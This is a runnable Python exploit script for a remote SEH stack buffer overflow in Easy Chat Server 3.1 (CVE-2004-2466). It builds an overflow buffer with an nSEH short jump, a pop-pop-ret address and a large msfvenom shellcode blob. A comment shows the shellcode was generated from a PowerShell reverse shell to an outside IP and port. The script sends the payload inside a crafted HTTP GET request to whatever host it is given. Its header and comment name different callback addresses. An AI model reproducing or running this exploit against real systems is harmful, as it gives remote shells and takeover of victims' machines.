# Exploit Title: Easy Chat Server 3.1 - Remote Stack Buffer Overflow (SEH)
# Exploit Author: r00tpgp @ http://www.r00tpgp.com
# Usage: python easychat-exploit.py <victim-ip> <port>
# Spawns reverse meterpreter LHOST=192.168.0.162 LPORT=1990
# CVE: CVE-2004-2466 
# Installer: http://www.echatserver.com/
# Tested on: Microsoft Windows 11 Pro x86-64 (10.0.22000 N/A Build 22000)

#!/usr/bin/python3

import sys
import socket
from struct import pack

host = sys.argv[1]  # Recieve IP from user
port = int(sys.argv[2])  # Recieve Port from user

junk = b"A" * (221-4)
#nseh = pack("<L", 0x06eb9090)  # short jump 6 bytes
#nseh = pack("<L", 0x42424242)  # short jump 6 bytes
nseh = b"\xEB\x06\x90\x90"
seh = pack("<L", 0x1001ae86)  # pop pop ret 1001AE86 SSLEAY32.DLL

# msfvenom -p windows/exec CMD="powershell -NoP -NonI -W Hidden -Exec Bypass -c \"\$client = New-Object System.Net.Sockets.TCPClient('192.168.247.193',7777 );\$s = \$client.GetStream();[byte[]]\$b = 0..65535|%{0};while((\$i = \$s.Read(\$b, 0, \$b.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0, \$i);\$sb = (iex \$data 2>&1 | Out-String );\$sb2 = \$sb + 'PS ' + (pwd).Path + '> ';\$sbt = ([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$sbt,0,\$sbt.Length);\$s.Flush()};\$client.Close()\"" -f python -b "\x00\x20" -v shellcode > file

shellcode = b"\x90" * 16
shellcode += b"\xbb\x44\x46\x8e\xf0\xda\xd5\xd9\x74\x24\xf4"
shellcode += b"\x58\x29\xc9\xb1\xa7\x83\xc0\x04\x31\x58\x0f"
shellcode += b"\x03\x58\x4b\xa4\x7b\x0c\xbb\xaa\x84\xed\x3b"
shellcode += b"\xcb\x0d\x08\x0a\xcb\x6a\x58\x3c\xfb\xf9\x0c"
shellcode += b"\xb0\x70\xaf\xa4\x43\xf4\x78\xca\xe4\xb3\x5e"
shellcode += b"\xe5\xf5\xe8\xa3\x64\x75\xf3\xf7\x46\x44\x3c"
shellcode += b"\x0a\x86\x81\x21\xe7\xda\x5a\x2d\x5a\xcb\xef"
shellcode += b"\x7b\x67\x60\xa3\x6a\xef\x95\x73\x8c\xde\x0b"
shellcode += b"\x08\xd7\xc0\xaa\xdd\x63\x49\xb5\x02\x49\x03"
shellcode += b"\x4e\xf0\x25\x92\x86\xc9\xc6\x39\xe7\xe6\x34"
shellcode += b"\x43\x2f\xc0\xa6\x36\x59\x33\x5a\x41\x9e\x4e"
shellcode += b"\x80\xc4\x05\xe8\x43\x7e\xe2\x09\x87\x19\x61"
shellcode += b"\x05\x6c\x6d\x2d\x09\x73\xa2\x45\x35\xf8\x45"
shellcode += b"\x8a\xbc\xba\x61\x0e\xe5\x19\x0b\x17\x43\xcf"
shellcode += b"\x34\x47\x2c\xb0\x90\x03\xc0\xa5\xa8\x49\x8e"
shellcode += b"\x38\x3e\xf4\xfc\x3b\x40\xf7\x50\x54\x71\x7c"
shellcode += b"\x3f\x23\x8e\x57\x04\xdb\xc4\xfa\x2c\x74\x81"
shellcode += b"\x6e\x6d\x19\x32\x45\xb1\x24\xb1\x6c\x49\xd3"
shellcode += b"\xa9\x04\x4c\x9f\x6d\xf4\x3c\xb0\x1b\xfa\x93"
shellcode += b"\xb1\x09\x8a\x7c\x39\xd7\x19\xf1\xad\x72\xb2"
shellcode += b"\x99\x0d\x50\x04\x0e\x1e\x8a\xb5\x9e\xf1\xa4"
shellcode += b"\x8c\x3e\x23\x6e\x2f\x76\x52\xf4\x4b\xe3\xca"
shellcode += b"\xd4\xbe\xae\x6a\x70\xa2\x10\xc9\x03\x54\x31"
shellcode += b"\xbe\x80\xb4\x9c\x23\x47\x97\xfa\xc0\xeb\xbe"
shellcode += b"\x67\x69\x80\x60\x5a\x55\x26\x04\xd3\xb8\xf9"
shellcode += b"\xa4\x71\xa6\x66\x5d\xa5\x7b\x10\xee\xd1\x1e"
shellcode += b"\x8f\x3e\x57\x84\x3b\x11\x34\x29\xa7\x06\xdf"
shellcode += b"\xc1\x54\xf7\x4b\x69\xcb\x44\x1f\x04\x8e\x24"
shellcode += b"\xab\xfe\x77\x88\x6a\xcd\x59\xdb\xba\x09\x88"
shellcode += b"\x29\xf6\x5e\xfa\x7c\xcf\x93\x25\x53\x18\xe3"
shellcode += b"\x1e\x9c\x46\x22\x5a\xc6\xf5\x14\xa1\x26\xdd"
shellcode += b"\x37\xb5\x4f\x78\xd6\x31\xbe\xc5\x43\xce\xed"
shellcode += b"\xbd\xf9\x4b\x73\x50\xd6\xba\x48\xf1\x44\xc4"
shellcode += b"\xda\x60\xd2\x6b\x7e\x4e\x86\xb3\xbd\xae\x76"
shellcode += b"\x9a\x93\x98\x43\xd7\xd8\xd1\xd7\x32\x64\x29"
shellcode += b"\x55\x06\xed\x21\xcc\x14\x74\x99\x26\xc1\x1f"
shellcode += b"\xf9\x0b\x29\xc4\x8a\x5d\x7b\x61\x0d\xc6\x53"
shellcode += b"\x4d\xaf\x2a\x84\xbd\x03\x13\xe0\xdf\x75\x1f"
shellcode += b"\x8d\x71\xee\xeb\x25\xa7\xd9\x33\x9b\xd9\x7c"
shellcode += b"\x14\xd3\x0c\x05\x6f\x37\x2b\x98\xfb\x56\x93"
shellcode += b"\x67\x24\xb1\x9d\xf2\x53\xec\x6e\x9e\xf1\x8b"
shellcode += b"\x13\x2a\x26\x79\x80\xab\x56\xe4\x66\x2a\xfa"
shellcode += b"\x83\x56\xff\x7d\x3f\xe3\x9a\x10\x91\x5f\x01"
shellcode += b"\x93\x99\x71\x88\x30\x21\xc7\x43\xf2\xcb\xb4"
shellcode += b"\x3c\x98\x7a\x55\xa5\x49\x53\xee\x4c\xfe\xf8"
shellcode += b"\x84\xfc\x97\x90\x03\x28\x4c\x0f\xe0\x18\xa0"
shellcode += b"\xef\xdc\x31\x91\xd4\x38\xb2\x83\x0a\x7c\x14"
shellcode += b"\x6c\x22\x1b\x2c\x4c\x90\x87\xad\xf8\xb9\x67"
shellcode += b"\x1f\x3f\x1c\x59\x7f\x43\x40\xd6\x0a\xcf\xad"
shellcode += b"\xbb\x80\x5d\xc7\x55\x0f\x82\x3e\x91\xeb\xb1"
shellcode += b"\x22\xd7\xd3\x08\x83\x33\x60\x11\xe3\x10\xa6"
shellcode += b"\xf2\xb3\x35\x86\xdb\x13\x91\xe6\x0b\x24\x92"
shellcode += b"\x82\x62\xea\x0c\x2b\x01\x9a\x8c\x80\xc9\x7d"
shellcode += b"\xf3\xf6\x2e\xb9\x2f\x85\x52\xc9\x0f\x54\xb3"
shellcode += b"\x19\x0b\xd2\xd6\x21\xdf\x34\x7c\xbc\x7c\x27"
shellcode += b"\x1a\x29\xed\xd0\xbf\x93\xcb\x5f\x13\xa7\x62"
shellcode += b"\x16\xba\x09\x32\xcd\xc8\x17\xc5\x79\x54\xeb"
shellcode += b"\x1d\xa5\xe5\x69\x6c\x8c\x32\x4a\xe3\xe0\x13"
shellcode += b"\xe0\x6a\x88\xfe\x2c\x49\x03\x63\x59\xbd\xd3"
shellcode += b"\x4f\x85\xce\x71\xe4\xeb\x7c\x10\x6a\x93\x08"
shellcode += b"\xb2\x5b\x60\xd5\x31\xb2\xd0\x79\xc0\xb9\xb4"
shellcode += b"\xa9\x03\x43\x7e\x8e\x30\xd7\xe9\xab\xd8\x53"
shellcode += b"\xc4\x70\x48\xf3\x6b\x12\xb8\x22\xae\xdc"


buffer = b"GET /chat.ghp?username=" + junk + nseh + seh + shellcode + b"&password=&room=1&sex=1 HTTP/1.1\r\n"
buffer += b"User-Agent: Mozilla/4.0\r\n"
buffer += b"Host: 192.168.1.136:80\r\n"
buffer += b"Accept-Language: en-us\r\n"
buffer += b"Accept-Encoding: gzip, deflate\r\n"
buffer += b"Referer: http://192.168.1.136\r\n"
buffer += b"Connection: Keep-Alive\r\n\r\n"

print("[*] Sending evil buffer...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(buffer)
s.close()
print("[+] Done!")

